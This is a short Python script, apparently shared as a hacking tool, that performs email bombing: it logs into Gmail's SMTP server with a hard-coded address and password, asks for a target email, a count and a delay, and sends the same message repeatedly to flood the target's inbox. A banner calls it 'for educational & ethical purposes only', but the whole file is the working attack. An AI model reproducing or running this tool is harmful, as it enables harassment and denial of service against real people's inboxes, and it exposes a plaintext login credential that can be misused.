import os,sys,time,smtplib
os.system("clear")
print("""\033[1;32m 

.----.    .--.   .---.  .-..-. .----.   .---.   .----.  .----. .-. 
} {-. \  / {} \  } }}_} | ' /  | {_} } / {-. \ { {__-` { {__-` { | 
} '-} / /  /\  \ | } \  | . \  | {_} } \ '-} / .-._} } .-._} } | } 
`----'  `-'  `-' `-'-'  `-'`-` `----'   `---'  `----'  `----'  `-' 

          System Maker :: darkboss1
\033[1;31m════════════════════════════════════════════
\033[1;33m[•] Tool Name    : Email Attack
[•] Developed By : darkboss1
[•] GitHub       : github.com/darkboss1
[•] Version      : 2.1.1
[•] Status       : ONLINE
\033[1;31m════════════════════════════════════════════
\033[1;36m[!] This tool is made for educational & ethical purposes only.
[!] Misuse of this tool is strictly prohibited.
\033[131m★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★\033[0m""")

# SMTP Setup
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

server.login("lamiya1234564@gmail.com", "bjnedmijdpwayvtl")
# Inputs
to = input("\033[1;32mEnter Target Email: \033[0m")
limit = int(input("\033[1;32mEnter Limit: \033[0m"))
delay = float(input("\033[1;32mEnter Delay (in seconds): \033[0m"))

# Email Content (same as original)
msg = "Subject: For fun only\n\nAssalamu Alaikum wa Rahmatullah \nHow are you?"
# Spinner Loading Before Bombing Starts
spinner = ['|', '/', '-', '\\']
print("\n\033[1;31m[•] Starting Email Bombing.........\033[0m", end="")
for _ in range(20):
    for frame in spinner:
        sys.stdout.write(f"\r\033[1;31m[•] Starting Email Bombing.........{frame}\033[0m")
        sys.stdout.flush()
        time.sleep(0.1)

print("\r\033[1;33m[✓] Email Bombing Started.......!                \033[0m")
# Sending Emails
#print("\n\033[1;33m[•] Starting Email Bombing.........\033[0m\n")
for i in range(limit):
    try:
        server.sendmail("lamiya1234564@gmail.com", to, msg)
        print(f"\033[1;32m[{i+1}] Email Sent Successfully...!\033[0m")
    except Exception as e:
        print(f"\033[1;31m[{i+1}] Failed: {e}\033[0m")
    time.sleep(delay)

# Close connection
server.quit()
print("\n\033[1;36m[✔] Email Bombing Finished!\033[0m")